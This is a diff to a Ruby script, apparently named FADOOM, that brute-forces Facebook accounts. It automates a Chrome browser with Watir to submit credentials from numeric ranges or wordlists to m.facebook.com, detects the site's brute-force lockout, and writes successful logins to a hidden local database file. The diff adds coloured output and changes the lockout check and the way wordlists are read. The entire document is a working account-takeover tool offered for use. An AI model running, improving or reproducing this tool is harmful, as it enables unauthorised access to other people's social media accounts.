@@ -1,16 +1,20 @@
 #!/bin/ruby
+require 'watir-webdriver'
+require 'terminal-table'
+require 'colorize'
+
 trap("SIGINT") { throw :ctrl_c }
 catch :ctrl_c do
 begin
 
 	system("clear")
-	puts '___________    _____    ________    ________       _____     _|=|_   '
-	puts '\_   _____/   /  _  \   \______ \   \_____  \     /     \   /     \  '
-	puts ' |    __)    /  /_\  \   |    |  \   /   |   \   /  \ /  \ ( (| |) ) '
-	puts ' |     \    /    |    \  |    `   \ /    |    \ /    Y    \ \_   _/  '
-	puts ' \___  /    \____|__  / /_______  / \_______  / \____|__  /   | |    '
-	puts '     \/             \/          \/          \/          \/    |_|    '
-	puts '                       CODED BY MAGDY MOUSTAFA                    '
+	puts '___________    _____    ________    ________       _____     _|=|_   '.yellow
+	puts '\_   _____/   /  _  \   \______ \   \_____  \     /     \   /     \  '.yellow
+	puts ' |    __)    /  /_\  \   |    |  \   /   |   \   /  \ /  \ ( (| |) ) '.yellow
+	puts ' |     \    /    |    \  |    `   \ /    |    \ /    Y    \ \_   _/  '.yellow
+	puts ' \___  /    \____|__  / /_______  / \_______  / \____|__  /   | |    '.yellow
+	puts '     \/             \/          \/          \/          \/    |_|    '.yellow
+	puts '                       CODED BY MAGDY MOUSTAFA                    '.red
 	puts ''
 	def help
 		puts "|[   -db => show database successful logins , use with clear '-dbs clear' to delete database "
@@ -43,11 +47,8 @@ begin
 			help
 	end
 
-	require 'watir-webdriver'
-	require 'terminal-table'
-
 	if ARGV[0] =~ /-/
-		@browser = Watir::Browser.new
+		@browser = Watir::Browser.new :chrome
 		@browser.goto 'https://m.facebook.com'
 	else
 		help
@@ -55,28 +56,29 @@ begin
 	rows= []
 	table = Terminal::Table.new :headings => [ "Target" , "Password " , "Task Information" ], :rows => rows , :style => {:width => 60 }
 	table.style = { :padding_left => 3, :border_x => "=", :border_i => "x"}
-	puts table
+	puts "#{table}".yellow
 
 	@v=0
 	@ttf = ARGV[4].to_i
 	def browserr ( b1 , b2 )
 		def browser_action
                         @browser.close
-                        @browser = Watir::Browser.new
+                        @browser = Watir::Browser.new :chrome
                         @browser.goto "https://m.facebook.com"
 		end
-		@browser.text_field( :name => 'email' ).set b1
+	            @browser.text_field( :name => 'email' ).set b1
 		    @browser.text_field( :name => 'pass' ).set b2
+		    sleep 1
 		    @browser.button( :name => 'login' ).click
 		    sleep 2
-		    if @browser.link( :href => "https://m.facebook.com/?refid=9" ).exists? == true && @browser.text_field( :name => 'email' ).exists? == false || @browser.text_field( :name => 'pass' ).exists? == false			
+		    if @browser.text.include?("try again later") == true			
 			@rows2 = []
                         @rows2 << [ "[X] Failed To Login , Facebook Breuteforce Detection ERR " ]
                         @table2 = Terminal::Table.new :rows => @rows2
                         @table2.style = { :border_x => "=", :border_i => "x"}
 			puts ''
 			@browser.close
-                        puts @table2
+                        puts "#{@table2}".red
 			exit
 		    elsif @browser.text_field( :name => 'email' ).exists? == false || @browser.text_field( :name => 'pass' ).exists? == false || @browser.button( :name => 'login' ).exists? == false
 				
@@ -84,9 +86,9 @@ begin
 		        @rows2 << [ b1 , b2  , "[+] Succeed To Login" ]
 		        @table2 = Terminal::Table.new :rows => @rows2 , :style => {:width => 60 }
 		        @table2.style = { :padding_left => 3, :border_x => "=", :border_i => "x"}
-		        puts @table2
+		        puts "#{@table2}".blue
 			open('.database.txt', 'a') { |f|
-	 			 f.puts @table2
+	 			 f.puts "#{@table2}"
 			}
 			if ARGV[3] == "-ttf" || ARGV[3] == "--ttf" || ARGV[3] == "--targets-to-find"
 	        		@v=@v+1
@@ -101,26 +103,27 @@ begin
                         @rows2 << [ b1 , b2 , "[X] Failed To Login" ]
                         @table2 = Terminal::Table.new :rows => @rows2 , :style => {:width => 60 }
                         @table2.style = { :padding_left => 3, :border_x => "=", :border_i => "x"}
-                        puts @table2
+                        puts "#{@table2}".red
 		    end
 	end
 
 	if ARGV[0] == "-m1" || ARGV[0] == "--mode1"
 		    for i in ARGV[1] .. ARGV[2]
-			browserr i, i 
+			browserr i , i 
 		    end
 	elsif ARGV[0] == "-m2" || ARGV[0] == "--mode2"
-		f = File.open( ARGV[2], "r")
-		f.each_line do |line| 
-	  		browserr ARGV[1] , line 
-		end
-		f.close
+                f = File.new( ARGV[2] , "r")
+                while (line = f.gets)
+                        browserr ARGV[1] , line
+                end
+                f.close
+
 	elsif ARGV[0] == "-m1+" || ARGV[0] == "--mode1+"
-		    f = File.open( ARGV[1], "r")
-		    f.each_line do |line|
-		            browserr line , line
-		    end
-		    f.close
+                f = File.new( ARGV[1] , "r")
+                while (line = f.gets)
+                        browserr line , line
+                end
+                f.close
 	end
 	@browser.close
 	rescue Exception
